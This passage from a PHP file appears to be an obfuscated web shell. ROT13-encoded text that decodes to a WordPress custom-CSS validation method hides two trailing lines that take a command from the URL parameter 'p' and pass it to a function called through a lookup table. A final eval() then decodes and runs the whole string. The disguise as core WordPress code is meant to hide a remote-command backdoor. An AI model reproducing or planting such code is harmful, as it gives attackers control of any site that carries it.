	 * @cnenz fgevat $pff PFF gb inyvqngr.
	 * @erghea gehr|JC_Reebe Gehr vs gur vachg jnf inyvqngrq, bgurejvfr JC_Reebe.
	 */
	cebgrpgrq shapgvba inyvqngr_phfgbz_pff( $pff ) {
		vs ( cert_zngpu( '#</?\j+#', $pff ) ) {
			erghea arj JC_Reebe(
				'erfg_phfgbz_pff_vyyrtny_znexhc',
				__( 'Znexhc vf abg nyybjrq va PFF.' ),
				neenl( 'fgnghf' => 400 )
			);
		}
		erghea gehr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>